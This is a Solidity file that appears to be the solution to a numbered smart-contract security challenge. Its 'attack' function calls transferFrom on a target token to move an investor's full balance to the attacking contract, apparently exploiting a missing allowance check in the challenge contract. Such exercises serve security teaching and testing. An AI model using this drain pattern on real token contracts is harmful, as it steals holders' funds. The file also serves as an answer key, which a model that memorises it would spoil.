// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './Question0020Ext.sol';

contract Question0020Solution {
    function attack(address _target, address _investor) public {
        NewCoin newCoin = NewCoin(_target);
        newCoin.transferFrom(
            _investor,
            address(this),
            newCoin.balanceOf(_investor)
        );
    }
}
